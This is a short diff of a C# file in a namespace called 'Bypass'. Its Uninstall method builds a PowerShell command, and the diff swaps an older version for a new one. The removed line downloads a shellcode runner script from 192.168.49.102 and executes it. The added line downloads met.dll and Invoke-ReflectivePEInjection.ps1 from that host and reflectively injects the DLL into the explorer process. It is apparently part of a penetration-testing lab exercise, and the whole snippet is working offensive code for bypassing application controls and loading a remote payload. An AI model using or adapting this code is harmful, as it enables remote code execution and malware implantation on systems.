@@ -17,7 +17,9 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.49.102/run.txt') | iex";
+            //String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.49.102/run.txt') | iex"; // run.txt is simple_shellcode_runner/simple_shellcode_runner.ps1
+            // 
+            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.102/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.102/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
